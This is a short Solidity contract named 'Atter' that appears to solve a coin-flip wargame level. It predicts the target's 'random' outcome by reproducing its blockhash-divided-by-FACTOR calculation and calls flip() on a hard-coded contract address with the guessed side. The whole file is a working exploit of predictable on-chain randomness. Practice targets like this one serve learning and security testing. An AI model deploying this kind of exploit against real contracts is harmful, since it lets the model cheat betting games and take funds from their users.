// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
    function flip (bool _guess) external returns (bool);
}

contract Atter {
    using SafeMath for uint256;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function calling() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);

        bool side = coinFlip == 1 ? true : false;

        ICoinFlip(0x76C013Fae106E7675d736b128b37Cfc05B59386c).flip(side);
        
    }

}